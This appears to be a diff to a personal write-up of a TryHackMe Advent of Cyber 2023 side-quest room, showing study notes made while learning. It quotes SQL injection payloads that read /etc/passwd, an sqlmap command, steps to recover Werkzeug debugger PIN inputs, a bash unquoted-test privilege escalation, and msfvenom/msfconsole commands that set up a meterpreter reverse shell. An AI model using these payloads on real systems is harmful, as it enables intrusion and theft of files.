@@ -19,7 +19,7 @@ Beyond Root:
 
 During December of 2023 I realised I could not do this puzzle. The rabbithole would ruin my plans and figuring out what I needed to do. I really wanted to do it, but I also did not have a team. The only thing I did was type:
 
-Yeti, Bandit and Advent in the search terms to find three of the rooms:
+Yeti, Bandit and Advent in the search terms to find three of the rooms, but I came across the day 3 room through 0xb0b:
 
 [Side Quest Room](https://tryhackme.com/room/adventofcyber23sidequest)
 [Day 1](https://tryhackme.com/room/adv3nt0fdbopsjcap)
@@ -281,6 +281,7 @@ Before I get carried away with my beyond root 4 hour python automation Dev time,
 - The QR code for this room was in Day 20 machine, in picture of the gitlab instance - `Day_20_calendar.png`
 - There is a Union SQL injection where we can retrieve files `UNION SELECT "file:///etc/passwd" -- -` as the files are stored in the database as ID that the backend then calls another function to retrieve the file on disk 
 - [nouman404](https://nouman404.github.io/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day4#sqli) did `id=0' union select all concat('file:///etc/passwd')-- -`
+- ![](sqliforday4.png)
 - [h3lli0t](https://h3lli0t.github.io/The-Bandit-Surfer-THM/) used `sqlmap -u "http://10.10.203.181:8000/download?id=" --dbs`, then `'+UNION+SELECT+"file:///etc/passwd"+--+-` in BurpSuite
 - Because werkzeug is a python webserver, similar to enumerating a SSTI we need to enumerate our capabilities of exploiting the vulnerability with that of the python functions allowed for the webserver to make by class ids '
 - The additional complexity is that need to retrieve the `private_bits` list from `app.py` so we need:
@@ -339,7 +340,30 @@ print(rv)
 ```
 They all were the same and I have no idea whom to credit for it.
 
+For MAC address of the eth0 interface
+![](macaddressforday4.png)
+
+![](machineidday4.png)
+
+Checking the reliability myself - it is not a reliable exploit 
+```python
+02:68:16:8f:de:67 # MAC Address -> 0x
+aee6189caee449718070b58132f2e4ba # machine id
+
+# Covert MAC addresses to decimal
+mac="02:68:16:8f:de:67";
+print(f"0x{mac.replace(':','')}")
+
+```
+
+![](interestingcrackers.png)
+
 This will be the second machine I auto-exploit from the set just to try use breakpoints and debug in VS code. 
+
+![](passinthegits.png)
+
+Regardless of the mistake checking the mysql database was good from remember sql
+![](wronigcommit.png)
 
 For root:
 - [GitTools](https://github.com/internetwache/GitTools): `gitdumper.sh`, `extractor.sh`
@@ -353,10 +377,35 @@ app.config['MYSQL_DB'] = 'elfimages'
 mysql = MySQL(app)```
 - `secure_path` environment can run run `/usr/bin/bash /opt/check.sh`, which uses `/opt/.bashrc` (bash run commands) is sourced from the `/opt/check.sh`
 - [h3lli0t](https://h3lli0t.github.io/The-Bandit-Surfer-THM/) `[` is actually a command, equivalent to the `test` command.
+
+```bash
+msfconsole -x "use /exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 4444;exploit;"
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOURVPNIP LPORT=4445 -f elf -o payload2.elf
+```
+
+![](scptorootgrepingallthecoffee.png)
+
+![](changethepermsfool.png)
+
+`[`
+
+![](bashtorootwithweirdcharacters.png)
+
+I am sure I was slightly devastated at Privilege Escalation similar to this on a HTB box. It is a very nasty you just need to know what the pieces are - ie in this case the scripts - do not rabbit hole and ask the question how is it implemented and how do I control what and how it is implemented. It is a nasty Privilege Escalation after a while you can just take for grant a way a human make a file, how bash scripting works, BUT crucially that bash works a particular way and if it is not quotes, it is special CHARACTERS. Therefore to simplify for memorising the crucial information: 
+- is it quotes?
+- is it special character being parsed by something related to the context 
+- have write/draw/noted out the context so that you can step back and be able to apply this everywhere? BECAUSE THIS IS REALLY NASTY PRIVILEGE ESCALATION.  
+![](enableexplaination.png)
+
+![](nastyroot.png)
+
+
 ## Post-Completion-Reflection  
 
 - The people that unknowingly contributed to my fast-track exposure to these topics are awesome!
 - The first day I could not really add anything useful or helpful I knew basically nothing even though I have done well in packet analysis challenges - LEARNT A LOT
+- Sometimes taking the stress out of trying and trying to view the entire CTF or a step without the pain will hopeful increase serious gains.
 
 ## Beyond Root
 
